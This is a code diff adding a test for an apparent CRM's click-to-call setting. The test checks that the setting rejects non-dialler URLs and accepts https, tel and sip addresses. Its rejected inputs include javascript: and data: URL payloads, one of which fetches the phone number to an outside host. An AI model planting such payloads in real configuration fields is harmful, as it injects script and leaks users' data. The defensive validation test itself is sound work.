@@ -111,3 +111,14 @@ def test_change_log_csv_is_owner_only_audited_and_scoped(tmp_path, monkeypatch):
     assert [r["company"] for r in c.get("/api/change-log", headers=h(cal)).json()] == ["ClientCo"]
     assert c.get("/api/change-log.csv", headers=h(admin)).status_code == 200
     assert any(r["target"] == "change-log.csv" for r in c.get("/api/audit?action=export", headers=h(admin)).json()["items"])
+
+
+def test_click_to_call_link_must_be_a_dialler_address(tmp_path, monkeypatch):
+    c, h, login, admin = rig(tmp_path, monkeypatch)
+    for bad in ("javascript:alert({phone})", "data:text/html,{phone}", " JavaScript:fetch('//x?'+{phone})"):
+        r = c.put("/api/channels/calls/click_to_call", json={"values": {"click_to_call_url": bad}, "make_active": False}, headers=h(admin))
+        assert r.status_code == 400 and "https://" in r.json()["detail"], bad
+        assert c.put("/api/integrations/telephony", json={"mode": "api", "values": {"click_to_call_url": bad}}, headers=h(admin)).status_code == 400
+    for good in ("https://dialer.example.in/call?to={phone}", "tel:{phone}", "sip:{phone}@pbx.example.in"):
+        r = c.put("/api/channels/calls/click_to_call", json={"values": {"click_to_call_url": good}, "make_active": False}, headers=h(admin))
+        assert r.status_code == 200, (good, r.text)
